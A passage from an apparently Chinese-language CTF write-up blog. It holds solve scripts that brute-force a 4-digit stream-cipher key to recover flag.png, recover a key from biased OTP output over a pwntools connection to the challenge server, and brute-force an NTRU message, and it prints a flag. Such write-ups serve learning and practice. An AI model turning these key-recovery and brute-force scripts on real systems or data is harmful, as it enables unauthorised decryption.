class="built_in">len</span>(ciphertext)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Brute force key 0000-9999</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        key_str = <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span></span><br><span class="line">        key = [<span class="built_in">int</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key_str] <span class="comment"># key bytes?</span></span><br><span class="line">        <span class="comment"># Code: key 4 valid digits.</span></span><br><span class="line">        <span class="comment"># v10 += *(_BYTE *)(v7 + v11) + v12;</span></span><br><span class="line">        <span class="comment"># v7 is key string pointer. v7 points to char bytes &#x27;0&#x27;...&#x27;9&#x27;.</span></span><br><span class="line">        <span class="comment"># So key bytes are ord(&#x27;0&#x27;)...ord(&#x27;9&#x27;).</span></span><br><span class="line">        key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key_str]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init S-box</span></span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># KSA</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[k] + key_bytes[k % <span class="number">4</span>]) % <span class="number">256</span></span><br><span class="line">            S[k], S[j] = S[j], S[k]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Decrypt first 16 bytes for check</span></span><br><span class="line">        header = <span class="built_in">bytearray</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># PRGA state</span></span><br><span class="line">        <span class="comment"># v13 = 0, v14 = 0</span></span><br><span class="line">        S_prga = <span class="built_in">list</span>(S)</span><br><span class="line">        j_prga = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># To decrypt: Plain = Cipher ^ (K + 69)</span></span><br><span class="line">        <span class="comment"># Check PNG header: 89 50 4E 47 0D 0A 1A 0A</span></span><br><span class="line">        </span><br><span class="line">        confirmed = <span class="literal">True</span></span><br><span class="line">        png_sig = [<span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>, <span class="number">0x1A</span>, <span class="number">0x0A</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            i_idx = (k + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j_prga = (j_prga + S_prga[i_idx]) % <span class="number">256</span></span><br><span class="line">            </span><br><span class="line">            S_prga[i_idx], S_prga[j_prga] = S_prga[j_prga], S_prga[i_idx]</span><br><span class="line">            </span><br><span class="line">            K = S_prga[(S_prga[i_idx] + S_prga[j_prga]) % <span class="number">256</span>]</span><br><span class="line">            </span><br><span class="line">            keystream_byte = (K + <span class="number">69</span>) % <span class="number">256</span></span><br><span class="line">            plain_byte = ciphertext[k] ^ keystream_byte</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> plain_byte != png_sig[k]:</span><br><span class="line">                confirmed = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> confirmed:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found Key: <span class="subst">&#123;key_str&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="comment"># Full decryption</span></span><br><span class="line">            plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">            S_prga = <span class="built_in">list</span>(S) <span class="comment"># reset S for full run</span></span><br><span class="line">            j_prga = <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">                i_idx = (k + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">                j_prga = (j_prga + S_prga[i_idx]) % <span class="number">256</span></span><br><span class="line">                S_prga[i_idx], S_prga[j_prga] = S_prga[j_prga], S_prga[i_idx]</span><br><span class="line">                K = S_prga[(S_prga[i_idx] + S_prga[j_prga]) % <span class="number">256</span>]</span><br><span class="line">                </span><br><span class="line">                plain_byte = ciphertext[k] ^ ((K + <span class="number">69</span>) % <span class="number">256</span>)</span><br><span class="line">                plaintext.append(plain_byte)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out:</span><br><span class="line">                out.write(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Saved flag.png&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjdlZGY4ZDYzNDRmODA4ZjQ1MjRkYTdkM2IzNDc2MGRfMEdQbUtHZWdTaGkwNjlrNGtJR0VDeXRMMEU4eEpXYWZfVG9rZW46TUcxU2JKSWZLb1NPOFd4NkoyY2M0dGt1blRnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Subgroup-Weaver"><a href="#Subgroup-Weaver" class="headerlink" title="Subgroup-Weaver"></a>Subgroup-Weaver</h3><p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, randbytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">key = randbytes(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(randint(<span class="number">1</span>, <span class="number">7</span>) % <span class="number">2</span> * <span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">otp</span>():</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(key) ^ gen(<span class="built_in">len</span>(key) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>) != key.<span class="built_in">hex</span>():</span><br><span class="line">    <span class="built_in">print</span>(otp())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;your prize: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里可以看出来otp是随机数我们可以通过收集的OTP是固定密钥与随机掩码的异或结果来恢复密钥。其中掩码的每个比特为1的概率约为4&#x2F;7。通过分析大量样本中每个比特位置1的频率，如果频率超过0.5，则推测密钥对应位为0，否则为1。最后将比特组合成字节形式的密钥。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_key</span>(<span class="params">otps</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(otps)</span><br><span class="line">    bits = <span class="number">512</span></span><br><span class="line">    counts = [<span class="number">0</span>] * bits</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> otp <span class="keyword">in</span> otps:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits):</span><br><span class="line">            counts[i] += (otp &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    key_bits = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits):</span><br><span class="line"></span><br><span class="line">        key_bits.append(<span class="number">0</span> <span class="keyword">if</span> counts[i] &gt; n / <span class="number">2</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    key_int = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(key_bits):</span><br><span class="line">        key_int |= (b &lt;&lt; i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key_int.to_bytes(<span class="number">64</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class="line">    port = <span class="number">43531</span></span><br><span class="line">    N = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = remote(host, port)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connected to <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Make sure you&#x27;re connected to the internet and the server is running.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    otps = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            conn.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">128</span>)  <span class="comment"># Send dummy hex string</span></span><br><span class="line">            response = conn.recvline().strip()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;your prize:&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Unexpected flag response: <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                otp_val = <span class="built_in">int</span>(response)</span><br><span class="line">                otps.append(otp_val)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Failed to parse response: <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Collected <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> samples&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection closed by server&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nTotal samples collected: <span class="subst">&#123;<span class="built_in">len</span>(otps)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(otps) &lt; <span class="number">100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not enough samples collected. Try again.&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    key = recover_key(otps)</span><br><span class="line">    key_hex = key.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Recovered key (hex): <span class="subst">&#123;key_hex&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, key_hex.encode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_line = conn.recvline()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;flag_line.decode().strip()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to receive flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>your prize: UniCTF{unb@l@nc3_0f64aa31b82ab}</p>
<h3 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h3><p>题目</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">NTRU Challenge - Public Parameters</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">N</span> <span class="string">=</span> <span class="number">31</span></span><br><span class="line"><span class="string">p</span> <span class="string">=</span> <span class="number">257</span></span><br><span class="line"><span class="string">q</span> <span class="string">=</span> <span class="number">12289</span></span><br><span class="line"><span class="string">h</span> <span class="string">=</span> [<span class="number">9603</span>, <span class="number">11838</span>, <span class="number">1242</span>, <span class="number">5868</span>, <span class="number">12249</span>, <span class="number">3130</span>, <span class="number">3722</span>, <span class="number">5910</span>, <span class="number">5879</span>, <span class="number">7672</span>, <span class="number">1119</span>, <span class="number">339</span>, <span class="number">10748</span>, <span class="number">7310</span>, <span class="number">6370</span>, <span class="number">9353</span>, <span class="number">10589</span>, <span class="number">10739</span>, <span class="number">10213</span>, <span class="number">2560</span>, <span class="number">5132</span>, <span class="number">4889</span>, <span class="number">11292</span>, <span class="number">2649</span>, <span class="number">2556</span>, <span class="number">8037</span>, <span class="number">3146</span>, <span class="number">9533</span>, <span class="number">11563</span>, <span class="number">1554</span>, <span class="number">304</span>]</span><br><span class="line"><span class="string">c</span> <span class="string">=</span> [<span class="number">91</span>, <span class="number">11459</span>, <span class="number">932</span>, <span class="number">4345</span>, <span class="number">12153</span>, <span class="number">9504</span>, <span class="number">5147</span>, <span class="number">7268</span>, <span class="number">2493</span>, <span class="number">8891</span>, <span class="number">8712</span>, <span class="number">5785</span>, <span class="number">11608</span>, <span class="number">7683</span>, <span class="number">11327</span>, <span class="number">8453</span>, <span class="number">10380</span>, <span class="number">6004</span>, <span class="number">7849</span>, <span class="number">1622</span>, <span class="number">6154</span>, <span class="number">10369</span>, <span class="number">10278</span>, <span class="number">769</span>, <span class="number">11676</span>, <span class="number">11492</span>, <span class="number">4564</span>, <span class="number">5445</span>, <span class="number">10909</span>, <span class="number">11502</span>, <span class="number">12216</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">if</span> <span class="string">__name__</span> <span class="string">==</span> <span class="attr">&quot;__main__&quot;:</span></span><br><span class="line">    <span class="string">print(&quot;NTRU</span> <span class="string">Challenge</span> <span class="string">Parameters:&quot;)</span></span><br><span class="line">    <span class="string">print(f&quot;N</span> <span class="string">=</span> &#123;<span class="string">N</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    print(f&quot;</span><span class="string">p</span> <span class="string">=</span> &#123;<span class="string">p</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    print(f&quot;</span><span class="string">q</span> <span class="string">=</span> &#123;<span class="string">q</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    print(f&quot;</span><span class="string">r_weight</span> <span class="string">=</span> <span class="number">4</span><span class="string">&quot;)</span></span><br><span class="line"><span class="string">    print(&quot;</span><span class="string">h</span> <span class="string">(first</span> <span class="number">5</span><span class="string">):&quot;,</span> <span class="string">h[:5],</span> <span class="string">&quot;...&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="string">print(&quot;c</span> <span class="string">(first</span> <span class="number">5</span><span class="string">):&quot;,</span> <span class="string">c[:5],</span> <span class="string">&quot;...&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="string">print()</span></span><br><span class="line">    <span class="string">print(&quot;Encryption:</span> <span class="string">c</span> <span class="string">=</span> <span class="string">r</span> <span class="string">*</span> <span class="string">h</span> <span class="string">+</span> <span class="string">m</span> <span class="string">(mod</span> <span class="string">q,</span> <span class="string">x^N-1)&quot;)</span></span><br><span class="line">    <span class="string">print(f&quot;where</span> <span class="string">r</span> <span class="string">has</span> <span class="string">only</span> <span class="number">4</span> <span class="string">non-zero</span> <span class="string">coefficients</span> <span class="string">(±1)&quot;)</span></span><br><span class="line">    <span class="string">print(&quot;Goal:</span> <span class="string">recover</span> <span class="string">the</span> <span class="string">message</span> <span class="string">m</span> <span class="string">containing</span> <span class="string">the</span> <span class="string">flag&quot;)</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过枚举所有可能的r（31个位置中选4个，每个非零系数为±1），计算候选消息m &#x3D; c - r*h mod q，并检查m的系数是否都在小范围内（0到256或q-256到q-1），可以恢复出原始消息</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import</span> <span class="string">itertools</span></span><br><span class="line"></span><br><span class="line"><span class="string">N</span> <span class="string">=</span> <span class="number">31</span></span><br><span class="line"><span class="string">p</span> <span class="string">=</span> <span class="number">257</span></span><br><span class="line"><span class="string">q</span> <span class="string">=</span> <span class="number">12289</span></span><br><span class="line"></span><br><span class="line"><span class="string">h</span> <span class="string">=</span> [<span class="number">9603</span>, <span class="number">11838</span>, <span class="number">1242</span>, <span class="number">5868</span>, <span class="number">12249</span>, <span class="number">3130</span>, <span class="number">3722</span>, <span class="number">5910</span>, <span class="number">5879</span>, <span class="number">7672</span>,</span><br><span class="line">     <span class="number">1119</span>, <span class="number">339</span>, <span class="number">10748</span>, <span class="number">7310</span>, <span class="number">6370</span>, <span class="number">9353</span>, <span class="number">10589</span>, <span class="number">10739</span>, <span class="number">10213</span>, <span class="number">2560</span>,</span><br><span class="line">     <span class="number">5132</span>, <span class="number">4889</span>, <span class="number">11292</span>, <span class="number">2649</span>, <span class="number">2556</span>, <span class="number">8037</span>, <span class="number">3146</span>, <span class="number">9533</span>, <span class="number">11563</span>, <span class="number">1554</span>, <span class="number">304</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">c</span> <span class="string">=</span> [<span class="number">91</span>, <span class="number">11459</span>, <span class="number">932</span>, <span class="number">4345</span>, <span class="number">12153</span>, <span class="number">9504</span>, <span class="number">5147</span>, <span class="number">7268</span>, <span class="number">2493</span>, <span class="number">8891</span>,</span><br><span class="line">     <span class="number">8712</span>, <span class="number">5785</span>, <span class="number">11608</span>, <span class="number">7683</span>, <span class="number">11327</span>, <span class="number">8453</span>, <span class="number">10380</span>, <span class="number">6004</span>, <span class="number">7849</span>, <span class="number">1622</span>,</span><br><span class="line">     <span class="number">6154</span>, <span class="number">10369</span>, <span class="number">10278</span>, <span class="number">769</span>, <span class="number">11676</span>, <span class="number">11492</span>, <span class="number">4564</span>, <span class="number">5445</span>, <span class="number">10909</span>, <span class="number">11502</span>, <span class="number">12216</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">poly_mult(a,</span> <span class="string">b,</span> <span class="string">N,</span> <span class="attr">modulus):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">res</span> <span class="string">=</span> [<span class="number">0</span>] <span class="string">*</span> <span class="string">N</span></span><br><span class="line">    <span class="attr">for i in range(len(a)):</span></span><br><span class="line">        <span class="string">if</span> <span class="string">a[i]</span> <span class="string">==</span> <span class="attr">0:</span> <span class="string">continue</span></span><br><span class="line">        <span class="attr">for j in range(len(b)):</span></span><br><span class="line">            <span class="string">deg</span> <span class="string">=</span> <span class="string">(i</span> <span class="string">+</span> <span class="string">j)</span> <span class="string">%</span> <span class="string">N</span></span><br><span class="line">            <span class="string">res[deg]</span> <span class="string">=</span> <span class="string">(res[deg]</span> <span class="string">+</span> <span class="string">a[i]</span> <span class="string">*</span> <span class="string">b[j])</span> <span class="string">%</span> <span class="string">modulus</span></span><br><span class="line">    <span class="string">return</span> <span class="string">res</span></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">poly_sub(a,</span> <span class="string">b,</span> <span class="attr">modulus):</span></span><br><span class="line"></span><br><span class="line">    <span class="string">res</span> <span class="string">=</span> []</span><br><span class="line">    <span class="attr">for i in range(len(a)):</span></span><br><span class="line">        <span class="string">val</span> <span class="string">=</span> <span class="string">(a[i]</span> <span class="bullet">-</span> <span class="string">b[i])</span> <span class="string">%</span> <span class="string">modulus</span></span><br><span class="line">        <span class="string">res.append(val)</span></span><br><span class="line">    <span class="string">return</span> <span class="string">res</span></span><br><span class="line"></span><br><span class="line"><span class="attr">def solve():</span></span><br><span class="line">    <span class="string">print(f&quot;[*]</span> <span class="attr">Target:</span> <span class="string">N=&#123;N&#125;,</span> <span class="string">q=&#123;q&#125;,</span> <span class="string">r_weight=4&quot;)</span></span><br><span class="line">    <span class="string">print(&quot;[*]</span> <span class="string">Starting</span> <span class="string">Brute</span> <span class="string">Force...&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="string">position_combinations</span> <span class="string">=</span> <span class="string">itertools.combinations(range(N),</span> <span class="number">4</span><span class="string">)</span></span><br><span class="line"></span><br><span class="line">    <span class="string">sign_combinations</span> <span class="string">=</span> <span class="string">list(itertools.product([1,</span> <span class="number">-1</span><span class="string">],</span> <span class="string">repeat=4))</span></span><br><span class="line"></span><br><span class="line">    <span class="string">count</span> <span class="string">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">for positions in position_combinations:</span></span><br><span class="line">        <span class="attr">for signs in sign_combinations:</span></span><br><span class="line">            <span class="string">count</span> <span class="string">+=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="string">r</span> <span class="string">=</span> [<span class="number">0</span>] <span class="string">*</span> <span class="string">N</span></span><br><span class="line">            <span class="attr">for i in range(4):</span></span><br><span class="line">                <span class="string">r[positions[i]]</span> <span class="string">=</span> <span class="string">signs[i]</span></span><br><span class="line"></span><br><span class="line">            <span class="string">rh</span> <span class="string">=</span> <span class="string">poly_mult(r,</span> <span class="string">h,</span> <span class="string">N,</span> <span class="string">q)</span></span><br><span class="line"></span><br><span class="line">            <span class="string">m_poly</span> <span class="string">=</span> <span class="string">poly_sub(c,</span> <span class="string">rh,</span> <span class="string">q)</span></span><br><span class="line"></span><br><span class="line">            <span class="string">is_valid_msg</span> <span class="string">=</span> <span class="literal">True</span></span><br><span class="line">            <span class="string">decoded_chars</span> <span class="string">=</span> []</span><br><span class="line"></span><br><span class="line">            <span class="attr">for val in m_poly:</span></span><br><span class="line">                <span class="string">if</span> <span class="string">val</span> <span class="string">&gt;</span> <span class="attr">127:</span> </span><br><span class="line">                    <span class="string">is_valid_msg</span> <span class="string">=</span> <span class="literal">False</span></span><br><span class="line">                    <span class="string">break</span></span><br><span class="line">                <span class="string">decoded_chars.append(chr(val))</span></span><br><span class="line"></span><br><span class="line">            <span class="attr">if is_valid_msg:</span></span><br><span class="line">                <span class="string">message</span> <span class="string">=</span> <span class="string">&quot;&quot;</span><span class="string">.join(decoded_chars)</span></span><br><span class="line">                <span class="string">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="string">in</span> <span class="string">message</span> <span class="string">or</span> <span class="string">&quot;flag&quot;</span> <span class="attr">in message.lower():</span></span><br><span class="line">                    <span class="string">print(&quot;-&quot;</span> <span class="string">*</span> <span class="number">40</span><span class="string">)</span></span><br><span class="line">                    <span class="string">print(f&quot;[!]</span> <span class="string">Found</span> <span class="string">Candidate</span> <span class="string">at</span> <span class="string">iteration</span> &#123;<span class="string">count</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">                    print(f&quot;</span>    <span class="attr">r positions:</span> &#123;<span class="string">positions</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">                    print(f&quot;</span>    <span class="attr">r signs:</span>     &#123;<span class="string">signs</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">                    print(f&quot;</span>[<span class="string">+</span>] <span class="attr">Message:</span>     &#123;<span class="string">message</span>&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">                    print(&quot;</span><span class="string">-&quot;</span> <span class="string">*</span> <span class="number">40</span><span class="string">)</span></span><br><span class="line">                    <span class="string">return</span>  </span><br><span class="line">    <span 